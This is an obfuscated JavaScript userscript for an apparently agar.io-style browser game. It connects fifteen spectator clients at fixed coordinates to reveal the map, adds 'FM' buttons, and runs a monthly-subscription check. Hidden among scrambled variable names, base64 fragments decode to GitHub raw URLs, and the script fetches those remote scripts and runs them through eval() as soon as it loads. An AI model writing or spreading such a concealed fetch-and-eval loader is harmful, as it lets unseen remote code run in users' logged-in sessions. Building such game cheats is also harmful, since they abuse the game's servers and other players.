(()=>{
let j,dl,cx,er,po,lk,da,__,hx,dt,ui,qw,mc,ch,pr,ax,mb,i,uy,o_,ma,rs,hg,li,t,q,v,kl,x,df = app
j = df.clients.spectate
pr = 0
nb = false
ma=atob
var l=(e)=>{for(let i=0;i<10+2+3;i++){
    e._initSpectate()
j[i].on('estabilished',()=>{
j[i].sendFreeSpectate()
})
    j[i].on('estabilished',()=>{
te()
    })
    ui()
}}
dt = new Date()
let r = ['RpL21mL21haW4vZC5qcw==','RpL21mL21haW4vbS5qcw==']
let es = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY'
let tx = '29tL3NoYWRvYW5kZW'
uy = [5,0,5,7,9,'t',1,'id']
mc=app.backend.state.user?app.backend.state.user[uy[7]]:null
o_ =function(_,__) {
let e,t,n
e = _+1
o = _-1
n=~~__
return n>=o&&n<=e
}
te=()=>{
    toastr.info("connected")
}
ax=(e)=>{
let _=e.find(e=>e.isFreeSpectate === false)
!_?toastr.error("All connected"):null
}
ch=(e,t)=>{var jf=new Date(e);var hf=new Date(t);var m=jf>hf?true:false;return m}
q=function(e){
'object'=== typeof e? te() : null }
v = (a) => {var c,k = a,c=j
l(k)
q(c)}
lk=new Date()
let ld = tx
function nc(){
i = arguments
const k = ma(`${es.concat(ld+r[0])}`);
var e = undefined===i[0]?k:i[0]
var _=new XMLHttpRequest
_.open("GET",e,1)
_.send()
_.onreadystatechange = function () {
let __=_.responseText
eval(__)
};
}
ui = function() {
for (let n = 0; n < j.length;n++) {
j[n].cursorX = x[n].x
j[n].cursorY = x[n].y
}
}

toastr.options.timeOut = 1000
rs = function(e){let l
e.length === 0? l = true: l = false
return l}
nc()
kl=()=>{app.clients.spectate.slice().forEach((c) => app.destroyClient(c));
app.clients.spectate.splice(0, app.clients.spectate.length);}
li = document.getElementsByClassName("fcols grow hinherit ")[0]
x = [{ x: -5066, y: -5936 },{ x: 0, y: -5936 },{ x: +5066, y: -5936 },{ x: -5066, y: -2967 },{ x: 0, y: -2967 },{ x: +5066, y: -2967 },{ x: -5066, y: 0 },{ x: 0, y: 0 },{ x: +5066, y: 0 },{ x: -5066, y: 2967 },{ x: 0, y: 2967 },{ x: +5066, y: 2967 },{ x: -5066, y: 5936 },{ x: 0, y: 5936 },{ x: +5066, y: 5936 }]
function _(p) {
    pr = 1
    
ui()
    
if(p.length==15){
    ax(j)
for (let i = 0;i<p.length;i++) {

if (p[i].isFreeSpectate === false) {
    p[i].connect(app.server.ws)

}
if (i===14) {
pr = 0
}
}}}
nc(ma(`${es.concat(tx+r[1])}`))
po=function(e) {
if (da[e]) {
return da[e];} else {
return null; }}
cx = function(n,t){
for (let i = 0; i < t.length && i < n.length; i++) {n[i].cursorX = t[i].x;
n[i].cursorY = t[i].y;}  
}   
dl = function(e,t,i,l){l===true?(
v(t),
cx(e,i),hx("tiva")):
(kl(),hx("De"))}
mb=()=>{ch(lk,po(mc))?
toastr.error("Renew monthly"):
(dl(j,df,
x,rs(j))


)}
er = document.createElement("button")
er.style.border = '1px solid white'
er.innerText = 'FM'
er.style.color = 'white'
er.style.backgroundColor = 'transparent'
er.addEventListener("click",mb)
li.appendChild(er)
hg = document.createElement("button")
hg.style.border = '1px solid white'
hg.innerText = 'FM+'
hg.style.color = 'white'
hg.style.backgroundColor = 'transparent'
hg.onclick = ()=>{
_(j)}
hx=(e)=>{
let p,t,o,j,d,s,k
t=toastr
p=t.info
k=e.concat('activated')
d=4
o=t.error
s = `Ac${e}ted`
j = 'De'.concat(s.toLocaleLowerCase())
'string'==typeof e?
    e=='tiva'?
p(s):o(k):
    null
}
df.server.on("userFriendlyToken", function () {
!rs(j) ? mb():null
});
li.appendChild(hg)
})()
